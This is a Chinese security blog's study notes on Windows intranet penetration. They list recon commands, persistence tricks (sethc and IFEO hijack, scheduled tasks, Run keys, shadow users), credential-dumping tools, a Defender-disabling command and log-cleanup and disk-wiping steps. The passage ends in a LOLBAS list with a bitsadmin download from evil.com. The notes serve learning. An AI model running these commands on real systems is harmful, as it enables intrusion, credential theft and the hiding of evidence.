



<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#FFF">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">

<link rel="icon" type="image/ico" sizes="32x32" href="/images/favicon.ico">
  <meta http-equiv="Cache-Control" content="no-transform">
  <meta http-equiv="Cache-Control" content="no-siteapp">


<link rel="alternate" type="application/rss+xml" title="Khala" href="https://mobius-0.github.io/rss.xml" />
<link rel="alternate" type="application/atom+xml" title="Khala" href="https://mobius-0.github.io/atom.xml" />
<link rel="alternate" type="application/json" title="Khala" href="https://mobius-0.github.io/feed.json" />

<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Mulish:300,300italic,400,400italic,700,700italic%7CFredericka%20the%20Great:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20JP:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20SC:300,300italic,400,400italic,700,700italic%7CInconsolata:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">

<link rel="stylesheet" href="/css/app.css?v=0.2.5">

  
  <meta name="keywords" content="Windows,渗透,信息收集,痕迹清理" />


<link rel="canonical" href="https://mobius-0.github.io/security/WebNote/Intranet%20penetration/Windows%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">



  <title>
Windows内网渗透 - 内网渗透 - WEB安全学习笔记 - 安全 |
FAF MAVE = Khala = 若要想看见妖精，就要有妖精的眼</title>
<meta name="generator" content="Hexo 6.3.0"></head>
<body itemscope itemtype="http://schema.org/WebPage">
  <div id="loading">
    <div class="cat">
      <div class="body"></div>
      <div class="head">
        <div class="face"></div>
      </div>
      <div class="foot">
        <div class="tummy-end"></div>
        <div class="bottom"></div>
        <div class="legs left"></div>
        <div class="legs right"></div>
      </div>
      <div class="paw">
        <div class="hands left"></div>
        <div class="hands right"></div>
      </div>
    </div>
  </div>
  <div id="container">
    <header id="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="inner">
        <div id="brand">
          <div class="pjax">
          
  <h1 itemprop="name headline">Windows内网渗透
  </h1>
  
<div class="meta">
  <span class="item" title="创建时间：2022-11-28 11:20:20">
    <span class="icon">
      <i class="ic i-calendar"></i>
    </span>
    <span class="text">发表于</span>
    <time itemprop="dateCreated datePublished" datetime="2022-11-28T11:20:20+08:00">2022-11-28</time>
  </span>
  <span class="item" title="本文字数">
    <span class="icon">
      <i class="ic i-pen"></i>
    </span>
    <span class="text">本文字数</span>
    <span>17k</span>
    <span class="text">字</span>
  </span>
  <span class="item" title="阅读时长">
    <span class="icon">
      <i class="ic i-clock"></i>
    </span>
    <span class="text">阅读时长</span>
    <span>20 分钟</span>
  </span>
</div>


          </div>
        </div>
        <nav id="nav">
  <div class="inner">
    <div class="toggle">
      <div class="lines" aria-label="切换导航栏">
        <span class="line"></span>
        <span class="line"></span>
        <span class="line"></span>
      </div>
    </div>
    <ul class="menu">
      <li class="item title"><a href="/" rel="start">FAF MAVE</a></li>
    </ul>
    <ul class="right">
      <li class="item theme">
        <i class="ic i-sun"></i>
      </li>
      <li class="item search">
        <i class="ic i-search"></i>
      </li>
    </ul>
  </div>
</nav>

      </div>
      <div id="imgs" class="pjax">
        <ul>
          <li class="item" data-background-image="https://s2.loli.net/2022/11/27/9NQXTSUlr4W37qg.jpg"></li>
          <li class="item" data-background-image="https://s2.loli.net/2022/11/18/FsDRNzyW3YfCE2S.jpg"></li>
          <li class="item" data-background-image="https://s2.loli.net/2022/11/25/C9Bpi5IXN167fyj.png"></li>
          <li class="item" data-background-image="https://s2.loli.net/2022/11/29/K9DNG5pBs4tJlQf.png"></li>
          <li class="item" data-background-image="https://s2.loli.net/2022/11/24/eFREUtlVwC3hfTA.png"></li>
          <li class="item" data-background-image="https://s2.loli.net/2022/11/13/KA7WHtm61zLES9T.png"></li>
        </ul>
      </div>
    
    <div id="waves">
      <svg class="waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto">
        <defs>
          <path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z" />
        </defs>
        <g class="parallax">
          <use xlink:href="#gentle-wave" x="48" y="0" />
          <use xlink:href="#gentle-wave" x="48" y="3" />
          <use xlink:href="#gentle-wave" x="48" y="5" />
          <use xlink:href="#gentle-wave" x="48" y="7" />
        </g>
      </svg>
    </div>
    </header>
    <main>
      <div class="inner">
        <div id="main" class="pjax">
          
  <div class="article wrap">
    
<div class="breadcrumb" itemscope itemtype="https://schema.org/BreadcrumbList">
<i class="ic i-home"></i>
<span><a href="/">首页</a></span><i class="ic i-angle-right"></i>
<span  itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem"><a href="/categories/security/" itemprop="item" rel="index" title="分类于 安全"><span itemprop="name">安全</span></a>
<meta itemprop="position" content="1" /></span>
<i class="ic i-angle-right"></i>
<span  itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem"><a href="/categories/security/WebNote/" itemprop="item" rel="index" title="分类于 WEB安全学习笔记"><span itemprop="name">WEB安全学习笔记</span></a>
<meta itemprop="position" content="2" /></span>
<i class="ic i-angle-right"></i>
<span  class="current" itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem"><a href="/categories/security/WebNote/Intranet-penetration/" itemprop="item" rel="index" title="分类于 内网渗透"><span itemprop="name">内网渗透</span></a>
<meta itemprop="position" content="3" /></span>
</div>

    <article itemscope itemtype="http://schema.org/Article" class="post block" lang="zh-CN">
  <link itemprop="mainEntityOfPage" href="https://mobius-0.github.io/security/WebNote/Intranet%20penetration/Windows%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">

  <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
    <meta itemprop="image" content="/images/avatar.jpg">
    <meta itemprop="name" content="晓楼">
    <meta itemprop="description" content="若要想看见妖精，就要有妖精的眼, GLHF">
  </span>

  <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
    <meta itemprop="name" content="Khala">
  </span>

  <div class="body md" itemprop="articleBody">
    

    <h1 id="信息收集"><a class="anchor" href="#信息收集">#</a> 信息收集</h1>
<h2 id="基本命令"><a class="anchor" href="#基本命令">#</a> 基本命令</h2>
<ul>
<li>主机名  <code>hostname</code></li>
<li>查询所有计算机名称  <code>dsquery computer</code></li>
<li>查看配置及补丁信息
<ul>
<li><code>systeminfo</code></li>
<li><code>wmic qfe get description,installedOn /format:csv</code></li>
</ul>
</li>
<li>查看版本  <code>ver</code></li>
<li>进程信息
<ul>
<li><code>tasklist /svc</code></li>
<li><code>wmic process get caption,executablepath,commandline /format:csv</code></li>
<li><code>get-process</code></li>
</ul>
</li>
<li>查看所有环境变量  <code>set</code></li>
<li>查看计划任务  <code>schtasks /QUERY /fo LIST /v</code></li>
<li>查看安装驱动  <code>DRIVERQUERY</code></li>
<li>查看操作系统信息
<ul>
<li>架构  <code>wmic os get osarchitecture</code></li>
<li>系统名  <code>wmic os get caption</code></li>
</ul>
</li>
<li>查看逻辑盘  <code>wmic logicaldisk get caption</code></li>
<li>查看安装的软件信息  <code>wmic product get name,version</code></li>
<li>查看服务信息
<ul>
<li><code>wmic service list brief</code></li>
<li><code>sc query</code></li>
<li><code>Get-WmiObject win32_service | select PathName</code></li>
</ul>
</li>
</ul>
<h2 id="域信息"><a class="anchor" href="#域信息">#</a> 域信息</h2>
<ul>
<li>获取当前组的计算机名  <code>net view</code></li>
<li>网络发现  <code>net view /all</code></li>
<li>查看所有域  <code>net view /domain</code></li>
<li>域森林、域树信息</li>
<li>域信任信息  <code>nltest /domain_trusts</code></li>
<li>定位域控  <code>net time /domain</code></li>
<li>查看域中的用户名  <code>dsquery user</code></li>
<li>查询域组名称  <code>net group /domain</code></li>
<li>查询域管理员  <code>net group &quot;Domain Admins&quot; /domain</code></li>
<li>域控信息
<ul>
<li><code>nltest /dclist:xx</code></li>
<li><code>Get-NetDomain</code></li>
<li><code>Get-NetDomainController</code></li>
<li><code>net group &quot;Domain controllers&quot;</code></li>
</ul>
</li>
<li>组策略</li>
</ul>
<h2 id="用户信息"><a class="anchor" href="#用户信息">#</a> 用户信息</h2>
<ul>
<li>查看用户
<ul>
<li><code>net user</code></li>
<li><code>whoami</code>  /  <code>whoami /priv</code>  /  <code>whoami /all</code></li>
<li><code>wmic useraccount get /ALL /format:csv</code></li>
</ul>
</li>
<li>用户特权信息  <code>whoami /priv</code></li>
<li>查看当前权限  <code>net localgroup administrators</code></li>
<li>查看在线用户  <code>quser</code>  /  <code>qwinsta</code>  /  <code>query user</code></li>
<li>查看当前计算机名，全名，用户名，系统版本，工作 站域，登陆域  <code>net config Workstation</code></li>
<li>ACL 信息  <code>get-acl</code></li>
</ul>
<h2 id="网络信息"><a class="anchor" href="#网络信息">#</a> 网络信息</h2>
<ul>
<li>内网网段信息</li>
<li>网卡信息  <code>ipconfig</code></li>
<li>外网出口</li>
<li>ARP 表  <code>arp -a</code></li>
<li>路由表  <code>route print</code></li>
<li>监听的端口  <code>netstat -ano</code></li>
<li>连接的端口</li>
<li>端口信息
<ul>
<li><code>Get-NetTCPConnection</code></li>
</ul>
</li>
<li>hosts 文件</li>
<li>主备 DNS</li>
<li>DNS 缓存
<ul>
<li><code>ipconfig /displaydns</code></li>
<li><code>Get-CimInstance -Namespace root/StandardCimv2 -ClassName MSFT_DNSClientCache</code></li>
</ul>
</li>
<li>探测出网情况
<ul>
<li>powershell -c &quot;1..65535 | % {echo ((new-object Net.Sockets.TcpClient).Connect('allports.exposed',$_)) _ } 2>null&quot;</li>
</ul>
</li>
</ul>
<h2 id="防火墙"><a class="anchor" href="#防火墙">#</a> 防火墙</h2>
<ul>
<li>查看防火墙状态  <code>netsh advfirewall show allprofiles</code></li>
<li>防火墙日志目录  <code>netsh firewall show logging</code></li>
<li>防火墙规则  <code>netsh advfirewall firewall show rule name=all</code></li>
<li><code>netsh firewall show config</code></li>
<li><code>netsh firewall show state</code></li>
</ul>
<h2 id="密码信息"><a class="anchor" href="#密码信息">#</a> 密码信息</h2>
<ul>
<li>Windows RDP 连接记录</li>
<li>浏览器中保存的账号密码</li>
<li>系统密码管理器中的各种密码</li>
<li>无人值守安装文件中的密码信息
<ul>
<li><code>C:\sysprep.inf</code></li>
<li><code>C:\sysprep\sysprep.xml</code></li>
<li><code>C:\Windows\Panther\Unattend\Unattended.xml</code></li>
<li><code>C:\Windows\Panther\Unattended.xml</code></li>
</ul>
</li>
</ul>
<h2 id="票据信息"><a class="anchor" href="#票据信息">#</a> 票据信息</h2>
<ul>
<li><code>cmdkey /l</code></li>
<li>klist</li>
<li>msf meterpreter</li>
</ul>
<h2 id="特殊文件"><a class="anchor" href="#特殊文件">#</a> 特殊文件</h2>
<ul>
<li>文档
<ul>
<li>xlsx / xls</li>
<li>docx / doc</li>
<li>pptx / ppt</li>
<li>vsdx / vsd</li>
<li>md / txt</li>
</ul>
</li>
<li>压缩文件
<ul>
<li>zip / rar / 7z</li>
</ul>
</li>
<li>VPN 配置
<ul>
<li>ovpn</li>
</ul>
</li>
<li>代码
<ul>
<li>py / php / jsp / aspx / asp / sql</li>
</ul>
</li>
<li>配置文件
<ul>
<li>conf / ini / xml</li>
</ul>
</li>
<li>特定关键字
<ul>
<li>账号 / 账户 / 登录 /login/user</li>
<li>密码 /pass</li>
<li>代码 / 文档 / 交接 / 备份 /git/svn</li>
<li>邮箱 / 通讯录 / 集群 / 办公</li>
<li>代理 / 内网 / VPN</li>
<li>设备 / 资产</li>
<li>系统 / 运维 / 拓扑 / 网络 / IT</li>
<li>后台 / 管理员 / 数据库</li>
<li>监控 / 隔离 / 防火墙 / 网闸 / 巡检</li>
</ul>
</li>
</ul>
<h2 id="局域网存活主机"><a class="anchor" href="#局域网存活主机">#</a> 局域网存活主机</h2>
<ul>
<li>NetBIOS 扫描</li>
<li>OXID 扫描</li>
</ul>
<h2 id="其他"><a class="anchor" href="#其他">#</a> 其他</h2>
<ul>
<li>启用的共享文件夹</li>
<li>回收站</li>
<li>最近运行的命令</li>
<li>访问文件历史记录</li>
<li>查看补丁安装情况
<ul>
<li><code>wmic qfe get Caption,Description,HotFixID,InstalledOn</code></li>
</ul>
</li>
<li>日志与事件信息
<ul>
<li><code>wevtutil</code></li>
<li><code>eventvwr</code></li>
</ul>
</li>
<li>注册表信息
<ul>
<li><code>reg</code></li>
</ul>
</li>
<li>安装的各类 agent 监控软件</li>
<li>安装的杀毒软件</li>
<li>查看 / 设置后缀关联
<ul>
<li><code>assoc</code></li>
<li><code>assoc .ext=example</code></li>
</ul>
</li>
<li>PowerShell 版本</li>
<li>.Net 版本</li>
<li>Wi-Fi 密码</li>
</ul>
<h1 id="持久化"><a class="anchor" href="#持久化">#</a> 持久化</h1>
<h2 id="隐藏文件"><a class="anchor" href="#隐藏文件">#</a> 隐藏文件</h2>
<ul>
<li>创建系统隐藏文件
<ul>
<li><code>attrib +s +a +r +h filename</code>  /  <code>attrib +s +h filename</code></li>
</ul>
</li>
<li>利用 NTFS ADS (Alternate　Data　Streams) 创建隐藏文件</li>
<li>利用 Windows 保留字
<ul>
<li><code>aux|prn|con|nul|com1|com2|com3|com4|com5|com6|com7|com8|com9|lpt1|lpt2|lpt3|lpt4|lpt5|lpt6|lpt7|lpt8|lpt9</code></li>
</ul>
</li>
</ul>
<h2 id="后门"><a class="anchor" href="#后门">#</a> 后门</h2>
<h3 id="sethc"><a class="anchor" href="#sethc">#</a> sethc</h3>
<p><code>sethc.exe</code>  是 Windows 系统在用户按下五次 shift 后调用的粘滞键处理程序，当有写文件但是没有执行权限时，可以通过替换  <code>sethc.exe</code>  的方式留下后门，在密码输入页面输入五次 shift 即可获得权限。</p>
<h3 id="映像劫持"><a class="anchor" href="#映像劫持">#</a> 映像劫持</h3>
<p>在高版本的 Windows 中，替换程序是受到系统保护的，需要使用其他的技巧来实现替换。</p>
<p>具体操作为在注册表的  <code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Option</code>  下添加项  <code>sethc.exe</code>  ，然后在  <code>sethc.exe</code>  这个项中添加  <code>debugger</code>  键，键值为恶意程序的路径。</p>
<h3 id="定时任务"><a class="anchor" href="#定时任务">#</a> 定时任务</h3>
<p>Windows 下有  <code>schtasks</code>  和  <code>at</code>  两种计划任务机制。 其中  <code>at</code>  在较高版本的 Windows 中已经弃用。</p>
<p>设置命令为  <code>schtasks /create /tn &quot;TEST_OnLogon&quot; /sc onlogon /tr &quot;cmd.exe /c calc.exe&quot;</code>  、  <code>schtasks /create /tn &quot;TEST_OnStartup&quot; /sc onstart /ru system /tr &quot;cmd.exe /c calc.exe&quot;</code>  。删除命令为  <code>schtasks /delete /tn &quot;TEST_OnLogon&quot; /f</code>  。</p>
<h3 id="登录脚本"><a class="anchor" href="#登录脚本">#</a> 登录脚本</h3>
<p>Windows 可以在用户登录前执行脚本，使用  <code>HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit</code>  设置。</p>
<p>也可在  <code>HKCU\Environment\</code>  路径下设置  <code>UserInitMprLogonScript</code>  来实现。</p>
<h3 id="屏幕保护程序"><a class="anchor" href="#屏幕保护程序">#</a> 屏幕保护程序</h3>
<p>Windows 可以自定义屏幕保护程序，使用  <code>HKEY_CURRENT_USER\Control Panel\Desktop</code>  设置。</p>
<h3 id="隐藏用户"><a class="anchor" href="#隐藏用户">#</a> 隐藏用户</h3>
<p>Windows 可以使用在用户名后加入  <code>$</code>  来创建隐藏用户，这种帐户可在一定条件下隐藏，但是仍可以通过控制面板查看。</p>
<p>在创建隐藏用户的基础上，可以修改注册表的方式创建影子用户，这种方式创建的用户只能通过注册表查看。</p>
<h3 id="clr"><a class="anchor" href="#clr">#</a> CLR</h3>
<p>CLR (Common Language Runtime Compilation) 公共语言运行时，是微软为.NET 产品构建的运行环境，可以粗略地理解为.NET 虚拟机。</p>
<p>.NET 程序的运行离不开 CLR，因此可以通过劫持 CLR 的方式实现后门。</p>
<h3 id="winlogon-helper-dll后门"><a class="anchor" href="#winlogon-helper-dll后门">#</a> Winlogon Helper DLL 后门</h3>
<p>Winlogon 是一个 Windows 组件，用来处理各种活动，如登录、注销、身份验证期间加载用户配置文件、关闭、锁定屏幕等。这种行为由注册表管理，该注册表定义在 Windows 登录期间启动哪些进程。所以可以依靠这个注册表来进行权限维持。</p>
<p>注册表位置如下：</p>
<ul>
<li><code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell</code>  用于执行 exe 程序</li>
<li><code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit</code>  用于执行 exe 程序</li>
<li><code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify</code>  用于执行 dll 文件</li>
</ul>
<h2 id="自启动"><a class="anchor" href="#自启动">#</a> 自启动</h2>
<h3 id="基于注册表的自启动"><a class="anchor" href="#基于注册表的自启动">#</a> 基于注册表的自启动</h3>
<p>通过在注册表中写入相应的键值可以实现程序的开机自启动，主要是  <code>Run</code>  和  <code>RunOnce</code>  ，其中 RunOnce 和 Run 区别在于 RunOnce 的键值只作用一次，执行完毕后会自动删除。</p>
<p>注册表如下：</p>
<ul>
<li><code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run</code></li>
<li><code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce</code></li>
<li><code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run</code></li>
<li><code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce</code></li>
<li><code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnceEx</code></li>
</ul>
<p>基于策略的自启动注册表设置如下：</p>
<ul>
<li><code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run</code></li>
<li><code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run</code></li>
</ul>
<p>设置启动文件夹注册表位置如下：</p>
<ul>
<li><code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders</code></li>
<li><code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders</code></li>
<li><code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders</code></li>
<li><code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders</code></li>
</ul>
<p>设置服务启动项注册表位置如下：</p>
<ul>
<li><code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce</code></li>
<li><code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce</code></li>
<li><code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices</code></li>
<li><code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServices</code></li>
</ul>
<p>用户自启动位置  <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit</code>  、  <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell</code>  ，其中  <code>Userinit</code>  键允许指定用逗号分隔的多个程序。</p>
<p>如果用户启动了屏幕保护程序，也可以通过屏幕保护程序来启动后面，相关注册表键值为：</p>
<ul>
<li><code>HKEY_CURRENT_USER\Control Panel\Desktop\ScreenSaveActive</code></li>
<li><code>HKEY_CURRENT_USER\Control Panel\Desktop\ScreenSaverIsSecure</code></li>
<li><code>HKEY_CURRENT_USER\Control Panel\Desktop\ScreenSaveTimeOut</code></li>
<li><code>HKEY_CURRENT_USER\Control Panel\Desktop\SCRNSAVE.EXE</code></li>
</ul>
<h3 id="基于特定目录的自启动"><a class="anchor" href="#基于特定目录的自启动">#</a> 基于特定目录的自启动</h3>
<p>自启动目录，  <code>C:\Users\Username\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup</code>  目录对特定用户生效，  <code>C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp</code>  对所有用户生效。在 NT6 以前，两个目录为  <code>C:\Documents and Settings\Username\Start Menu\Programs\StartUp</code>  /  <code>C:\Documents and Settings\All Users\Start Menu\Programs\StartUp</code>  。</p>
<h1 id="权限"><a class="anchor" href="#权限">#</a> 权限</h1>
<h2 id="uac"><a class="anchor" href="#uac">#</a> UAC</h2>
<h3 id="简介"><a class="anchor" href="#简介">#</a> 简介</h3>
<p>UAC (User Account Control) 是 Windows Vista 和 Windows Server 2008 引入的一个安全机制，当一些敏感操作发生时，会跳出提示显式要求系统权限。</p>
<p>当用户登陆 Windows 时，每个用户都会被授予一个 access token，这个 token 中有 security identifier (SID) 的信息，决定了用户的权限。</p>
<h3 id="会触发uac的操作"><a class="anchor" href="#会触发uac的操作">#</a> 会触发 UAC 的操作</h3>
<ul>
<li>以管理员权限启动应用</li>
<li>修改系统、UAC 设置</li>
<li>修改没有权限的文件或者目录（ % SystemRoot% / % ProgramFiles% 等 ）</li>
<li>修改 ACL (access control list)</li>
<li>安装驱动</li>
<li>增删账户，修改账户类型，激活来宾账户</li>
</ul>
<h3 id="bypass"><a class="anchor" href="#bypass">#</a> ByPass</h3>
<ul>
<li>DLL 相关</li>
<li>进程注入</li>
<li>注册表</li>
</ul>
<h2 id="权限提升"><a class="anchor" href="#权限提升">#</a> 权限提升</h2>
<p>权限提升有多重方式，有利用二进制漏洞、逻辑漏洞等技巧。利用二进制漏洞获取权限的方式是利用运行在内核态中的漏洞来执行代码。比如内核、驱动中的 UAF 或者其他类似的漏洞，以获得较高的权限。</p>
<p>逻辑漏洞主要是利用系统的一些逻辑存在问题的机制，比如有些文件夹用户可以写入，但是会以管理员权限启动。</p>
<h3 id="任意写文件利用"><a class="anchor" href="#任意写文件利用">#</a> 任意写文件利用</h3>
<p>在 Windows 中用户可以写的敏感位置主要有以下这些</p>
<ul>
<li>用户自身的文件和目录，包括  <code>AppData</code>   <code>Temp</code></li>
<li><code>C:\</code>  ，默认情况下用户可以写入</li>
<li><code>C:\ProgramData</code>  的子目录，默认情况下用户可以创建文件夹、写入文件</li>
<li><code>C:\Windows\Temp</code>  的子目录，默认情况下用户可以创建文件夹、写入文件</li>
</ul>
<p>具体的 ACL 信息可用 AccessChk, 或者 PowerShell 的  <code>Get-Acl</code>  命令查看。</p>
<p>可以利用对这些文件夹及其子目录的写权限，写入一些可能会被加载的 dll，利用 dll 的加载执行来获取权限。</p>
<h3 id="mof"><a class="anchor" href="#mof">#</a> MOF</h3>
<p>MOF 是 Windows 系统的一个文件（  <code>c:/windows/system32/wbem/mof/nullevt.mof</code>  ）叫做 &quot;托管对象格式&quot;，其作用是每隔五秒就会去监控进程创建和死亡。</p>
<p>当拥有文件上传的权限但是没有 Shell 时，可以上传定制的 mof 文件至相应的位置，一定时间后这个 mof 就会被执行。</p>
<p>一般会采用在 mof 中加入一段添加管理员用户的命令的 vbs 脚本，当执行后就拥有了新的管理员账户。</p>
<h3 id="凭证窃取"><a class="anchor" href="#凭证窃取">#</a> 凭证窃取</h3>
<ul>
<li>Windows 本地密码散列导出工具
<ul>
<li>mimikatz</li>
<li>lsass</li>
<li>wce</li>
<li>gsecdump</li>
<li>copypwd</li>
<li>Pwdump</li>
<li>ProcDump：<span class="exturl" data-url="aHR0cHM6Ly9kb2NzLm1pY3Jvc29mdC5jb20vZW4tdXMvc3lzaW50ZXJuYWxzL2Rvd25sb2Fkcy9wcm9jZHVtcA==">https://docs.microsoft.com/en-us/sysinternals/downloads/procdump</span></li>
</ul>
</li>
<li>Windows 本地密码破解工具
<ul>
<li>L0phtCrack</li>
<li>SAMInside</li>
<li>Ophcrack</li>
</ul>
</li>
<li>彩虹表破解</li>
<li>本机 hash + 明文抓取</li>
<li>win8+win2012 明文抓取</li>
<li>ntds.dit 的导出 + QuarkPwDump 读取分析</li>
<li>vssown.vbs + libesedb + NtdsXtract</li>
<li>ntdsdump</li>
<li>利用 powershell (DSInternals) 分析 hash</li>
<li>使用  <code>net use \\%computername% /u:%username%</code>  重置密码尝试次数</li>
<li>限制读取时，可 crash 操作系统后，在蓝屏的 dump 文件中读取</li>
</ul>
<h3 id="其他-2"><a class="anchor" href="#其他-2">#</a> 其他</h3>
<ul>
<li>组策略首选项漏洞</li>
<li>DLL 劫持</li>
<li>替换系统工具，实现后门</li>
<li>关闭 defender
<ul>
<li><code>Set-MpPreference -disablerealtimeMonitoring $true</code></li>
</ul>
</li>
</ul>
<h1 id="痕迹清理"><a class="anchor" href="#痕迹清理">#</a> 痕迹清理</h1>
<h2 id="日志"><a class="anchor" href="#日志">#</a> 日志</h2>
<ul>
<li>查看日志  <code>eventvwr</code></li>
<li>伪造日志  <code>eventcreate</code></li>
<li>操作日志
<ul>
<li>3389 登录列表</li>
<li>文件打开日志</li>
<li>文件修改日志</li>
<li>浏览器日志</li>
<li>系统事件</li>
<li>程序安装记录</li>
<li>程序删除记录</li>
<li>程序更新记录</li>
</ul>
</li>
<li>登录日志
<ul>
<li>系统安全日志</li>
</ul>
</li>
<li>日志路径
<ul>
<li>系统日志：  <code>%SystemRoot%\System32\Winevt\Logs\System.evtx</code></li>
<li>安全日志：  <code>%SystemRoot%\System32\Winevt\Logs\Security.evtx</code></li>
<li>应用程序日志：  <code>%SystemRoot%\System32\Winevt\Logs\Application.evtx</code></li>
</ul>
</li>
<li>服务日志
<ul>
<li>IIS：  <code>%SystemDrive%\inetpub\logs\LogFiles\W3SVC1\</code></li>
</ul>
</li>
</ul>
<h2 id="注册表"><a class="anchor" href="#注册表">#</a> 注册表</h2>
<ul>
<li>AppCompatFlags</li>
<li>Background Activity Moderator (BAM)</li>
<li>MuiCache</li>
<li>RecentApps</li>
<li>RunMRU</li>
<li>ShimCache (AppCompatCache)</li>
</ul>
<h3 id="注册表键"><a class="anchor" href="#注册表键">#</a> 注册表键</h3>
<ul>
<li>HKEY_LOCAL_MACHINEsystemCurrentControlSetServicesEventlog</li>
</ul>
<h2 id="文件"><a class="anchor" href="#文件">#</a> 文件</h2>
<h3 id="prefetch"><a class="anchor" href="#prefetch">#</a> Prefetch</h3>
<p>预读取文件夹，用来存放系统已访问过的文件的预读信息，扩展名为 PF。位置在  <code>C:\Windows\Prefetch</code>  。</p>
<h3 id="jumplists"><a class="anchor" href="#jumplists">#</a> JumpLists</h3>
<p>记录用户最近使用的文档和应用程序，方便用户快速跳转到指定文件，位置在  <code>%APPDATA%\Microsoft\Windows\Recent</code>  。</p>
<h3 id="amcache-recentfilecachebcf"><a class="anchor" href="#amcache-recentfilecachebcf">#</a> Amcache / RecentFileCache.bcf</h3>
<p>Windows 中的使用这两个文件来跟踪具有不同可执行文件的应用程序兼容性问题，它可用于确定可执行文件首次运行的时间和最后修改时间。</p>
<p>在 Windows 7、Windows Server 2008 R2 等系统中，文件保存在  <code>C:\Windows\AppCompat\Programs\RecentFileCache.bcf</code>  ，包含程序的创建时间、上次修改时间、上次访问时间和文件名。</p>
<p>在 Windows 8、Windows 10、Windows Server 2012 等系统中，文件保存在  <code>C:\Windows\AppCompat\Programs\Amcache.hve</code>  ，包含文件大小、版本、sha1、二进制文件类型等信息。</p>
<h2 id="时间轴"><a class="anchor" href="#时间轴">#</a> 时间轴</h2>
<p>Windows 时间轴是 Windows 10 在 1803 版中引入的一个新特性，会记录访问过的网站、编辑过的文档、运行的程序等，</p>
<h2 id="彻底删除"><a class="anchor" href="#彻底删除">#</a> 彻底删除</h2>
<ul>
<li>多次覆写文件  <code>cipher /w:&lt;path&gt;</code></li>
<li>格式化某磁盘 count 次  <code>format D: /P:&lt;count&gt;</code></li>
</ul>
<h1 id="横向移动"><a class="anchor" href="#横向移动">#</a> 横向移动</h1>
<h2 id="常见入口"><a class="anchor" href="#常见入口">#</a> 常见入口</h2>
<ul>
<li>SMB 弱密码</li>
<li>SqlServer 弱密码</li>
</ul>
<h2 id="lolbas"><a class="anchor" href="#lolbas">#</a> LOLBAS</h2>
<h3 id="简介-2"><a class="anchor" href="#简介-2">#</a> 简介</h3>
<p>LOLBAS，全称 Living Off The Land Binaries and Scripts (and also Libraries)，是一种白利用方式，是在 2013 年 DerbyCon 由 Christopher Campbell 和 Matt Graeber 发现，最终 Philip Goh 提出的概念。</p>
<p>这些程序一般有有 Microsoft 或第三方认证机构的签名，但是除了可以完成正常的功能，也能够被用于内网渗透中。这些程序可能会被用于：下载安全恶意程序、执行恶意代码、绕过 UAC、绕过程序控制等。</p>
<h3 id="常见程序"><a class="anchor" href="#常见程序">#</a> 常见程序</h3>
<ul>
<li>
<p>appsyncvpublishing.exe</p>
<ul>
<li>执行 powershell</li>
</ul>
</li>
<li>
<p>bitsadmin.exe</p>
<ul>
<li>下载文件  <code>bitsadmin /transfer &lt;job_name&gt; /priority &lt;priority&gt; &lt;remote_path&gt; &lt;local_path&gt;</code></li>
<li>下载文件  <code>bitsadmin /create 1 bitsadmin /addfile 1 https://evil.com/autoruns.exe c:\data\playfolder\autoruns.exe bitsadmin /RESUME 1 bitsadmin /complete 1</code></li>
